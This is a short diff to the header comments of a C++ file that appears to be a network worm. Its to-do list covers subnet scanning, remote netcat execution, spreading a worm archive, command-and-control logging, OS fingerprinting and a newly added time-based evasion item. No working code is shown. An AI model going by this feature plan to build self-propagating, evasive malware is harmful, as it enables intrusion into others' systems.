@@ -7,9 +7,10 @@
 // - Apply multithreading to speed up subnet scan for targets.
 // - Fix remote netcat execution (currently non-permission to launch executable, or tar a worm.tar file).
 // - Change from "ens35" hard-corded interface name to scan and select available interface.
-// - Utilize PowerShell commands if target OS is WIN32.
+// - Detect OS of target system (banner grabbing), change approach based off of OS (utilize PowerShell commands if target OS is WIN32).
 // - Remove connection loop to first target, move on to second target.
 // - Add Command & Control (C2) logging on original host for all subsequent target-hosts.
+// - Add time-based evasion.
 // - Among other things...
 
 #include <iostream>
